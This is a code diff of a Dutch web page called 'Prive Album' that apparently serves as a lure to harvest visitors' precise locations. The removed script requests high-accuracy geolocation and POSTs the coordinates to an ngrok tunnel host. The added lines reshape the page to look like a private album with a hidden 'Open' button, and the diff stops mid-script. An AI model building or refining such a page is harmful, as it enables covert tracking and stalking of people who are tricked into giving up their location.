@@ -3,72 +3,27 @@
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Prive Album — Locatie Demo</title>
+  <title>Prive Album</title>
   <style>
     body{font-family:system-ui,Segoe UI,Helvetica,Arial;max-width:700px;margin:2rem auto;padding:0 1rem;}
-    button{padding:.6rem 1rem;font-size:1rem}
-    #output{margin-top:1rem;white-space:pre-line}
+    button{padding:.6rem 1rem;font-size:1rem;margin-top:1rem;}
+    #output{margin-top:1rem;white-space:pre-line;}
   </style>
 </head>
 <body>
   <h1>Prive Album</h1>
-  <p>Klik op de knop en geef toestemming om je nauwkeurige locatie te delen.</p>
-
-  <button id="btn">Klik hier om locatie te delen</button>
+  <p>Klik eerst op de knop om toestemming te geven voor je locatie.</p>
+  <button id="btn-request">Toestemming locatie</button>
+  <button id="btn-open" style="display:none;">Openen</button>
   <p id="output">Nog geen locatie.</p>
 
   <script>
-    const btn = document.getElementById('btn');
+    const btnRequest = document.getElementById('btn-request');
+    const btnOpen = document.getElementById('btn-open');
     const output = document.getElementById('output');
 
-    async function getAccurateLocation() {
-      const desiredAccuracy = 10; // meters
-      let pos = null;
+    let coords = null; // Om de coördinaten tijdelijk op te slaan
 
-      output.textContent = 'Locatie wordt opgevraagd...';
-
-      while (!pos || pos.coords.accuracy > desiredAccuracy) {
-        try {
-          pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 30000,   // wacht 30 seconden
-              maximumAge: 0
-            });
-          });
-
-          output.textContent = `Latitude: ${pos.coords.latitude.toFixed(6)}
-Longitude: ${pos.coords.longitude.toFixed(6)}
-Nauwkeurigheid (m): ${pos.coords.accuracy}`;
-
-          if (pos.coords.accuracy <= desiredAccuracy) break;
-
-        } catch(err) {
-          output.textContent = 'Fout bij opvragen locatie: ' + err.message;
-          return;
-        }
-      }
-
-      // Verstuur naar server (vervang je NGROK URL)
-      try {
-        await fetch('https://hydrometallurgical-arla-hurryingly.ngrok-free.dev/send', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            timestamp: pos.timestamp
-          })
-        });
-        output.textContent += '\nVerzonden naar server ✔';
-      } catch(e) {
-        output.textContent += '\nVersturen mislukt ❌';
-        console.warn('Versturen mislukt', e);
-      }
-    }
-
-    btn.addEventListener('click', getAccurateLocation);
-  </script>
-</body>
-</html>
+    btnRequest.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        output.textContent = 'Geolocatie niet ondersteund door deze browser.';
